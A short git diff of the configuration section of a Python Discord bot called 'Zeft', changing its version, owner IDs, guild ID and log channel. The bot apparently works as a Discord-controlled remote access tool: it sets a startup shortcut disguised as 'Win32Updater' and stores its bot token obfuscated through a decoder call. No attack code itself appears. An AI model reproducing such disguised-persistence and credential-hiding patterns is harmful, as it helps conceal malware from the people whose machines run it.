@@ -19,19 +19,19 @@ cd = datetime.now().strftime('%Y-%m-%d %I.%M.%S')
 ### BOT CONFIG ###
 
 intver = 1.4
-version = 'v1.4.0b NOSOCKET'
+version = 'v1.4.1b NOSOCKET'
 attach_shortcut_name = "Win32Updater"
 prefix = 's.'
 mongouri = ''
 connectDB = False
-owner_ids = [1092548532180877415, 774894992728391710]
-main_guild = 1221547480290955386
+owner_ids = [1092548532180877415]
+main_guild = 1339949261756043336
 embedcolor = discord.Color.blurple()
 embederrorcolor = discord.Color.red()
 name = 'Zeft'
 token = get_token("𐽡𐽸𐽡𐼜𐽡𐽆𐽥𐽔𐽢𐽖𐽏𐽖𐽡𐽸𐽹𐼘𐽡𐽖𐽥𐼝𐽡𐽨𐽵𐽛𐽢𐽛𐼂𐽫𐽀𐽥𐽢𐽏𐽣𐼂𐼟𐼛𐼕𐼁𐽃𐼙𐽋𐽎𐽏𐼛𐽔𐽼𐽚𐽸𐽛𐽴𐼘𐽁𐽁𐽸𐼜𐼁𐽣𐽵𐽢𐼚𐽞𐽿𐽤𐽧𐽙𐽊𐼘𐽛𐽎𐽎𐽈𐼘", 69420) # I don't give a fck about this token
 client_id = 1328005965844316211
-log_channel = 1296812933455810591
+log_channel = 1345766880308236389
 
 
 ### ENV CONFIG ###
